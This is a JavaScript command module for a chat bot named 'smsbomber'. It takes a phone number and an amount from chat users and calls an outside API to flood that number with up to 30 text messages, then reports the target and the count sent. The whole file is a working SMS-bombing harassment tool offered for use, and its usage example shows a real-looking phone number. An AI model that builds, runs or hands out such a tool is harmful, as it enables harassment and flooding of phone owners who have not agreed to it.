const axios = require("axios");

module.exports = {
  config: {
    name: "smsbomber",
    version: "1.0.0",
    author: "vernex",
    description: "Send a large number of SMS to a target phone number using API",
    cooldowns: 10,
    dependencies: {
      axios: ""
    }
  },

  run: async function ({ api, event, args }) {
    const { threadID, messageID } = event;

    if (!args[0] || !args[1]) {
      return api.sendMessage(
        "📤 Usage:\n/smsbomber [phone_number] [amount]\n\nExample:\n/smsbomber 09503596043 10",
        threadID,
        messageID
      );
    }

    const phone = args[0];
    const times = parseInt(args[1]);

    if (isNaN(times) || times <= 0 || times > 30) {
      return api.sendMessage("❌ Invalid amount. Please enter a number between 1 and 30.", threadID, messageID);
    }

    try {
      await api.sendMessage(
        `📡 Sending ${times} SMS to ${phone}...\nPlease wait...`,
        threadID,
        messageID
      );

      const response = await axios.get(`https://haji-mix.up.railway.app/api/smsbomber?phone=${encodeURIComponent(phone)}&times=${times}`);
      const data = response.data;

      if (!data.status) {
        return api.sendMessage(`❌ Failed: ${data.message || "Unknown error occurred."}`, threadID, messageID);
      }

      const successMsg = `
════『 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥 』════

📞 Target: ${phone}
📨 Sent: ${times} SMS
✅ Status: Success

> Use responsibly.
      `.trim();

      return api.sendMessage(successMsg, threadID, messageID);
    } catch (error) {
      console.error("❌ Error in smsbomber:", error.message);
      return api.sendMessage(`❌ Error: ${error.message}`, threadID, messageID);
    }
  }
};
